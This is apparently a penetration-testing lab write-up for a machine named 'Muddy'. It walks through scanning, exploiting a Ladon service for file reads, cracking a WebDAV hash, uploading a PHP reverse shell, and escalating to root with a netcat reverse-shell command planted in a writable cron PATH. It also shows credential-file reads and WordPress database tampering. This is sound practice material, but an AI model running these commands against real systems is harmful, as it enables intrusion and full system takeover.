# Muddy

## Enumeration & scanning

### Standard scanning

- Scan services, find HTTP on 80 (Wordpress) and 8888 (Ladon).
- Wordpress website is very static, login page hidden. But has `/webdav` directory, unusual.
- Ladon service shows some function that can be run (`checkout`) over xmlrpc, SOAP, etc. 
- Find vulnerability in Ladon, exploit.

``` sh
# Scan all ports (also do -sV scan afterwards on found ports). Find Wordpress and Ladon service. 
sudo nmap -p- muddy.ugc
# Look for additional info on port 80, find /Webdav folder
sudo nmap -p 80 --script "vuln" muddy.ugc
```


## Exploitation

- Find exploit for Ladon service. Exploit via Burp.
- Can LFI other files, works for passwd file. Find user `ian`.
- Webdav folders store password in `passwd.dav` in the webdav folder, which is typically in `/var/www/html/webdav/`.
- Find creds, need to use hashcat to brute force password.
- Login to Webdav folder using Cadaver, upload reverse PHP shell. Run by opening in browser.
- Find local flag. Need privilege escalation.
- Use crontab with included vulnerable writable PATH (`/dev/shm/`). Find root flag.

``` sh
# Password brute forcing
# Look for hash type
hashcat -h | grep -i "apr"
# Crack hash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt 

# Cadaver
# Connect and upload shell
cadaver http://muddy.ugc/webdav 
put php-reverse-shell.php
# Setup netcat listener and upgrade shell
nc -nlvp 4444
python -c 'import pty; pty.spawn("/bin/bash")'

# Cron
# Find vulnerable cron PATH and jobs
cat /etc/crontab
# Setup malicious binary for reverse shell
echo 'nc -e /bin/bash 192.168.45.167 5555' > /dev/shm/netstat
chmod +x /dev/shm/netstat
nc -nlvp 5555
```

## References
- https://www.exploit-db.com/exploits/43113
- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#frequent-cron-jobs

## Rabbit holes

- Other scanning didn't yield needed results, such as other open ports. Those open ports appear in the 'ps' command during revshell as Netcat and Socat processes, just distraction.
- Lots of time wasted on trying to find interesting files using XXE. Found `ian` user, but no files to be found of interest such as SSH or bash_history related.
- Tried various Webdav default credentials to login.
- After local flag, got into Wordpress by finding database creds in `wp-config.php`, updating admin password, and finding slug needed to circumvent Easy Hide Login.

``` sh
# Nuclei, Feroxbuster, and wpscan scans didn't yield needed results
nuclei -target http://muddy.ugc:80
nuclei -target http://muddy.ugc:8888
feroxbuster -u http://muddy.ugc:8888
wpscan --url http://muddy.ugc -v

# XXE failed attempts
/home/ian/.bash_history
/home/ian/.ssh/id_rsa
/var/www/html/...
/root/...
/proc/...

# Webdav
jigsaw, ian, webdav, admin

# Wordpress access
# Get db creds
cat /var/www/html/wp-config.php
# Login to db, show databases and select all from users
mysql -h localhost -P 3306 -u wpadmin -p'ec99e2a005aa8cf0550ddfbdcde11141'
show databases;
show tables from wp;
select * from wp.wp_users;
# Find wp admin hash for 'ExtraCoolMuddyAdministrator' in phpass, brute force with hashcat failed (should be salted)
# Update pass instead
mysql -u wpadmin --password=ec99e2a005aa8cf0550ddfbdcde11141 -h localhost -e "use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
# Can't find login, look at plugins
cat /var/www/html/wp-content
# Look for slug of Easy Hide Login plugin (reason why login page wasn't found)
mysql -u wpadmin --password=ec99e2a005aa8cf0550ddfbdcde11141 -h localhost -e "use wp;SELECT * FROM wp.wp_options;" | grep "wpseh_l01gnhdlwp"
# Finally logged in as admin, but cannot upload/edit plugins because of lacking permissions. All wordpress folders were owned by root, not www-data
ls -la /var/www/html
# Try via XMLRPC as it's enabled according to wpscan, but same result
```
